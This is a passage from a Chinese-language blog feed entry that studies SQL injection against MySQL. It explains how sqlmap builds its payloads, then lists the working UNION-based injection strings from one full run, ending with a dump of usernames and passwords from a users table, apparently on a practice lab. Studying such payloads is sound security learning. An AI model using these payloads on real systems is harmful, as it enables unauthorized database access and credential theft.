721</span></span><br></pre></td></tr></table></figure><p>5.下面开始进行注入测试，如果没有指定sqlmap使用哪一种注入方式，它会将所有的注入方式都跑一遍。而且会按以下顺序进行注入，这就是为什么我们使用的sqlmap总喜欢用布尔盲注的原因。sqlmap中有以下几种注入方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--technique 参数</span></span><br><span class="line">B: <span class="type">Boolean</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（布尔型注⼊）</span><br><span class="line">E: Error<span class="operator">-</span>based <span class="keyword">SQL</span> injection（报错型注⼊）</span><br><span class="line">U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（可联合查询注⼊）</span><br><span class="line">S: Stacked queries <span class="keyword">SQL</span> injection（可多语句查询注⼊）</span><br><span class="line">T: <span class="type">Time</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（基于时间延迟注⼊）</span><br><span class="line">Q: inline_query <span class="keyword">SQL</span> injection(内联注⼊)</span><br></pre></td></tr></table></figure><ol start="6"><li>在文件<code>boundaries.xml</code> 中选取合适的闭合方式，里面都是单引号，双引号，括号等等符号的组合。 在文件<code>sqlmap/data/xml/payloads</code>下选取对应的payload。所以梳理⼀下思路，我们最终会发送给⽬标服务器的payload ，不过首先要先闭合，在文件<code>boundaries.xml</code> 中，然后从对应的注入类型的模板中提取对应参数，如布尔盲注模板，然后再到<code>queries.xml</code>中取出想要的表达式，最后有必要的话使用 temper 对payload 进行修饰，最后输出的就是一个完整的 payload 。</li></ol><p><strong>以下是sqlmap一次完整的注入</strong></p><p>7.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">6488</span><span class="comment">-- -</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 10-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">6</span><span class="comment">-- -</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 4-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">3</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>8.查数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,0x57546868445661497a474b574369506768417a597064667a614557616f6a754870464c64544e464a,0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x6b4158546d48415a41496e48596448615867594e49525374436954664d5574505871726d51455279</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x464843574f4973414372614d414a73595970426c5177534767687050454a4a5647795a5375445a61,0x7162706a71)-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x57525a45435572416663</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a6a6a71,0x5a70654458455a6e7344,0x7162706a71),NULL,NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x55626b6e586165436468</span>,<span class="number">0x7162706a71</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-4234</span><span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a6a6a71,0x766455794f71597656557757576c4c6d6447656975464946565576714c47486d5852766154455359,0x7162706a71),NULL,NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-9821&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x726557794d7a476c4d5975697274766d704845684c646f68746a6e674e6a66436a77774a4e5a4455</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-6633</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (2947=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2947) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-5741&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (VERSION() <span class="keyword">LIKE</span> <span class="number">0x254d61726961444225</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-9889</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-4073&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (@<span class="variable">@VERSION</span>_COMMENT <span class="keyword">LIKE</span> <span class="number">0x256472697a7a6c6525</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-4680</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-9973&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (AURORA_VERSION() <span class="keyword">LIKE</span> <span class="number">0x25</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-3008</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-5854&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="built_in">JSON_ARRAYAGG</span>(CONCAT_WS(<span class="number">0x6a77756c7677</span>,schema_name)),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA<span class="comment">-- -</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>9.查表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-4170</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,table_name)),0x7162706a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x7365637572697479)-- -</span></span><br></pre></td></tr></table></figure><p>10.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-8178</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,column_name,column_type)),0x7162706a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x7365637572697479-- -</span></span><br></pre></td></tr></table></figure><p>11.字段内容数据脱库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-3449</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,id,password,username)),0x7162706a71),NULL FROM security.users-- -</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h2&gt;&lt;p&gt;此文是基于MySQL数据库的学习记录&lt;/p&gt;
&lt;h2 id=&quot;认识sql注入&quot;&gt;&lt;a href=&quot;#认识sql注入&quot;</summary>
      
    
    
    
    <category term="SQL注入" scheme="https://www.mtrleed.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="注入" scheme="https://www.mtrleed.top/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
